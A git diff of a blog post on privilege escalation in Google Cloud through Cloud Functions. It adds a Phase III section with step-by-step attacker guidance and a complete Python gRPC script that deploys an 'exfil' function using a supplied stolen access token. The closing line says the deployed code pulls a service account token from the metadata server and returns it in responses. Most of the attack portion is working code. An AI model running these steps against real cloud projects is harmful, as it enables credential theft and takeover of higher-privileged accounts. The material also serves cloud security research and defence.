@@ -18,6 +18,8 @@
   - [Invoking the Cloud Function](#)
   - [Escalating Privilege to a high level Service Account](#)
 
+<br>
+
 ## Phase I - Ways to Deploy a Cloud Function in GCP
 
 There are three ways to deploy a Cloud Function in GCP: 
@@ -30,6 +32,8 @@ While Cloud Console may seem user-friendly for creating resources in GCP, we won
 
 Our focus in this blog is on creating a Cloud Function using the least privileges possible. That's also the reason why attackers tend to use the gCloud command and Cloud Function API (via gRPC or REST) to create resources. Furthermore, attackers mainly gain access to a GCP environment using stolen or compromised authentication tokens (auth_tokens). Cloud Console doesn't support authentication via auth_tokens. As a result, attackers may prefer to use the gCloud command or directly call the Cloud Function API via gRPC or REST API to create resources because they offer more flexibility in terms of authentication and control.
 
+<br>
+
 ### Ways to upload code in Cloud Function in GCP
 
 If you're creating a Cloud Function in GCP, you can use **Cloud Console, gCloud Command, **or** Cloud Function API** to do so. Regardless of the method you choose, you will need to upload the code into the Cloud Function. There are three different ways to upload the code:
@@ -39,6 +43,7 @@ If you're creating a Cloud Function in GCP, you can use **Cloud Console, gCloud 
 3. Cloud Repository
 
 <p><img src="https://github.com/anrbn/blog/blob/main/images/7.jpg"></p>
+<br>
 
 ### Permission Required for Deploying a Cloud Function (via gCloud)
 
@@ -133,6 +138,7 @@ Here's an image to understand it better.
 </table>
 
 >Note: You might encounter an Error: "*ERROR: (gcloud.functions.deploy) ResponseError: status=[403], code=[Ok], message=[Permission 'cloudfunctions.operations.get' denied on resource 'operations/bzQ2MjAvdXMtY2VudHJhbDEvZXhmaWwxL18yTjJSYkp6alBB' (or resource may not exist).]*". Don't worry about it, the Cloud Function will be created regardless without any errors.  
+<br>
 
 ### Permission Required for Deploying a Cloud Function (via gRPC & REST)
 
@@ -221,18 +227,18 @@ Below is a code that's calling the Cloud Function API via gRPC to deploy a Cloud
 
 ```python
 from google.cloud.functions_v1 import CloudFunctionsServiceClient, CloudFunction, CreateFunctionRequest
-import google.auth
-import time
-
-credentials, project_id = google.auth.default()
+import google.oauth2.credentials
 
 #------change this--------
 location = "us-east1"
 function_name = "exfil11"
 gsutil_uri = "gs://anirb/function.zip"
 function_entry_point = "exfil"
+project_id="nnnn-374620"
 #-------------------------
 
+access_token = input('Enter Access Token: ')
+credentials = google.oauth2.credentials.Credentials(access_token)
 client = CloudFunctionsServiceClient(credentials=credentials)
 
 url = "https://{}-{}.cloudfunctions.net/{}".format(location, project_id, function_name)
@@ -255,7 +261,6 @@ try:
     print("[+] Takes 1-2 minutes to create")
 
 except Exception as e:
-
     if "cloudfunctions.operations.get" in str(e):
         print("[+] Permission cloudfunctions.operations.get denied (Not an Issue)")
         print(f"[+] Function Invocation URL: {url}")
@@ -368,6 +373,7 @@ Now, there's a special member called `allUsers` that represents anyone on the in
 >Note: Granting allUsers permissions to a Cloud Function, you are essentially making your Cloud Function publicly accessible to anyone who knows the URL.
 
 In order to grant the `allUsers` member the `Cloud Function Invoker` role, the user or service account performing the operation must have certain permissions. 
+<br>
 
 ### Permission Required to Set IAM Policy Binding to a Cloud Function
 
@@ -511,6 +517,75 @@ response = client.set_iam_policy(request={"resource": name, "policy": policy})
 print("[+] Done.")
 ```
 ## Phase III - Privilege Escalating via Cloud Function in Google Cloud Platform
-Deploying a Cloud Function via Cloud Function API (gRPC)
+To Privilege Escalate via Cloud Function in Google Cloud Platform we'll be taking the path with least privileges possible. 
+- Deploying the Cloud Function
+  - Identify how you'd to **Upload the Source Code** & via which method.
+    - Ways to upload the Source Code: Local Machine, Cloud Storage, Cloud Repository
+    - Methods Available: gCloud, Cloud Function API (gRPC/REST)
+- Setting IAM Policy Binding to the Cloud Function
+  - Identify how you'd **Set the IAM Policy Binding to the Cloud Function**.
+    - Methods Available: gCloud, Cloud Function API (gRPC/REST)
+
+**Deploying the Cloud Function**: We'll deploy the Cloud Function by setting the Source Code from Cloud Storage via the Cloud Function API (gRPC) as it requires the least privileges.
+
+**Setting IAM Policy Binding to the Cloud Function**: We'll set the IAM Policy Binding to the Cloud Function via Cloud Function API (gRPC) as it's the one that does it with least permissions than others.
+
+>Note: One can use either gRPC or REST to make requests to the Cloud Function API, the Cloud Function API will then interact with the Cloud Functions service. The Permissions required to Deploy and Set IAM Policy Binding are same for both gRPC and REST.
+
+These are the permissions required for the overall task:
+- `iam.serviceAccounts.actAs`
+- `cloudfunctions.functions.create`
+- `cloudfunctions.functions.setIamPolicy`
+
+### Deploying the Cloud Function (via gRPC)
+Use the following script to deploy the Cloud Function. This script sets the source code for a Cloud Function using Cloud Storage.
+
+
+```python
+from google.cloud.functions_v1 import CloudFunctionsServiceClient, CloudFunction, CreateFunctionRequest
+import google.oauth2.credentials
+
+#------change this--------
+location = "us-east1"
+function_name = "exfil11"
+gsutil_uri = "gs://anirb/function.zip"
+function_entry_point = "exfil"
+project_id="nnnn-374620"
+#-------------------------
+
+access_token = input('Enter Access Token: ')
+credentials = google.oauth2.credentials.Credentials(access_token)
+client = CloudFunctionsServiceClient(credentials=credentials)
+
+url = "https://{}-{}.cloudfunctions.net/{}".format(location, project_id, function_name)
+
+function = CloudFunction(
+    name="projects/{}/locations/{}/functions/{}".format(project_id, location, function_name),
+    source_archive_url="{}".format(gsutil_uri),
+    entry_point=function_entry_point,
+    runtime="python38",
+    https_trigger={},
+)
+
+request = CreateFunctionRequest(location="projects/{}/locations/{}".format(project_id, location), function=function)
+
+try:
+    response = client.create_function(request=request)
+    result = response.result()
+    print(f"[+] Function Invocation URL: {url}")
+    print("[+] Cloud Function creation has started")
+    print("[+] Takes 1-2 minutes to create")
+
+except Exception as e:
+    if "cloudfunctions.operations.get" in str(e):
+        print("[+] Permission cloudfunctions.operations.get denied (Not an Issue)")
+        print(f"[+] Function Invocation URL: {url}")
+        print("[+] Cloud Function creation has started")
+        print("[+] Takes 1-2 minutes to create")
+        
+    else:
+        print(f"[!] Error: {str(e)}")
+```
+
 
 The code will query the metadata server and retrieve an access token and then print that token to the logs and response body when a request is made to that specific endpoint.
